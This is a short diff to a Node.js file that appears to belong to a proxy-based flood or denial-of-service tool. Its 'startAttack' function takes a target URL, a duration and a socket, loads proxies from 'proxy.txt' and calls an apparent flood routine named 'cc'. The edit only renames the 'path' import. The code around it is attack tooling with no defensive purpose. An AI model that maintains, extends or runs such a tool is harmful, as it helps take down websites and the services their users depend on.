@@ -1,6 +1,6 @@
 const { cc, post, head, ParseUrl } = require('./main');
 const fs = require('fs');
-const path = require('path');
+const nodePath = require('path'); 
 
 let attackInProgress = false;
 let attackInterval;
@@ -10,7 +10,7 @@ const startAttack = (url, time, socket) => {
   attackInProgress = true;
 
   ParseUrl(url);
-  const proxies = fs.readFileSync(path.join(__dirname, 'proxy.txt'), 'utf8').split('\n');
+  const proxies = fs.readFileSync(nodePath.join(__dirname, 'proxy.txt'), 'utf8').split('\n');
 
   cc({ wait: () => {}, set: () => {} }, 5);
 
